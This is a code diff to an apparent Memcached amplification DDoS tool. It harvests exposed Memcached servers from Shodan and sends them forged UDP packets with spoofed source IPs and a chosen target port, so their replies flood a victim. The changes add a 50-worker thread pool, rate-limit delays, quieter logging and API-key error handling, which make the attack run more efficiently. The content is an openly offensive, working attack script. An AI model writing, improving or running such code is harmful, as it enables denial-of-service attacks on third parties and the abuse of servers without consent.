@@ -12,6 +12,7 @@ from contextlib import contextmanager, redirect_stdout
 import datetime
 from random import randint, uniform, choice
 from threading import Thread
+from concurrent.futures import ThreadPoolExecutor
 
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
@@ -78,6 +79,9 @@ else:
         file.write(SHODAN_API_KEY)
         print('[~] File written: ./api.txt')
 
+# To store debugging information
+debug_logs = []
+
 while True:
     api = shodan.Shodan(SHODAN_API_KEY)
     try:
@@ -91,6 +95,7 @@ while True:
                 for page in range(1, (total_results // 100) + 2):
                     results = api.search('product:"Memcached" port:11211', page=page)
                     all_matches.extend(results['matches'])
+                    time.sleep(2)  # Avoid rate-limiting
                 print(f'[~] Total bots retrieved: {len(all_matches)}')
 
                 saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
@@ -153,29 +158,39 @@ while True:
         def send_payload(ip):
             src_ip = random_ip()
             payload = generate_payload()
-            print(f'[+] Sending forged payloads to: {ip} from spoofed IP: {src_ip}')
             try:
                 response = sr1(IP(src=src_ip, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=payload), timeout=2, verbose=0)
                 if response:
-                    print(f'[✓] Response received from {ip}')
+                    debug_logs.append(f"[✓] Response received from {ip}")
                 else:
-                    print(f'[!] No response from {ip}')
+                    debug_logs.append(f"[!] No response from {ip}")
             except Exception as e:
-                print(f'[✘] Error while sending to {ip}: {e}')
+                debug_logs.append(f"[✘] Error while sending to {ip}: {e}")
             time.sleep(uniform(0.5, 2))  # Introduce random delays
 
-        threads = []
-        for ip in ip_array:
-            t = Thread(target=send_payload, args=(ip,))
-            threads.append(t)
-            t.start()
-
-        for t in threads:
-            t.join()
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            executor.map(send_payload, ip_array)
 
         print('[✓] Task complete! Exiting platform.')
+        print('\nDebug Log:')
+        for log in debug_logs:
+            print(log)
         break
 
+    except shodan.APIError as e:
+        print(f'[✘] Shodan API Error: {e}')
+        option = input('[*] Would you like to change the API Key? <Y/n>: ').lower()
+        if option.startswith('y'):
+            SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
+            with open('api.txt', 'w') as file:
+                file.write(SHODAN_API_KEY)
+                print('[~] File written: ./api.txt')
+            # Reinitialize the Shodan API client
+            api = shodan.Shodan(SHODAN_API_KEY)
+        else:
+            print('[✘] Exiting program.')
+            break
     except Exception as e:
         logging.error(f'Unexpected error: {e}')
         break
+
